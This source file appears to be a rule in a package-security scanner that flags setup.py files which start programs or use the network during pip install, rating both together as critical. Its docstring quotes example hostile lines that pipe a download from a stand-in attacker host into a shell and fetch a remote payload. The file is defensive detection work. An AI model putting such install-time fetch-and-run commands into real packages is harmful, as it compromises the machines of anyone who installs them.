"""setup.py that starts programs or uses the network when the package is installed.

`pip install` of an sdist runs its setup.py, so anything in it runs on the
victim's machine before they've imported (or even looked at) the package:

    os.system("curl evil.example | sh")              # process
    requests.get("https://evil.example/payload")     # network

Honest setup.py files mostly just call setup(). Some run `git describe` for a
version number or download build data, so:

- process or network calls                       -> high
- both (e.g. download something, then run it)    -> critical

Only the sdist counts: wheels are installed by copying files, without running setup.py.
"""

from __future__ import annotations

from crotalus.models import AnalysisContext, Finding
from crotalus.rules.static_code_analysis_helpers import (
    calls,
    is_network,
    is_process,
    read,
    snippet,
)


def check(context: AnalysisContext) -> list[Finding]:
    if context.sdist is None or "setup.py" not in context.sdist.files:
        return []
    py_file = read(context.sdist.files["setup.py"])
    if py_file is None:
        return []

    process_calls: set[str] = set()
    network_calls: set[str] = set()
    examples = []  # where each call is, for the evidence
    in_order = sorted(calls(py_file), key=lambda call: call[1].lineno)
    for call_name, call_node in in_order:
        if call_name is None:
            continue
        if is_process(call_name):
            process_calls.add(call_name)
        elif is_network(call_name):
            network_calls.add(call_name)
        else:
            continue
        examples.append(
            {"call": call_name, "line": call_node.lineno, "snippet": snippet(py_file, call_node)}
        )
    if not examples:
        return []

    kinds = []
    if process_calls:
        kinds.append("starts programs")
    if network_calls:
        kinds.append("uses the network")
    return [
        Finding(
            rule_id="setup_py_install_time",
            severity="critical" if process_calls and network_calls else "high",
            message=f"setup.py {' and '.join(kinds)} at install time",
            evidence={
                "file": "setup.py",
                "process_calls": sorted(process_calls),
                "network_calls": sorted(network_calls),
                "calls": examples[:10],  # the first few is enough to see what it does
            },
        )
    ]
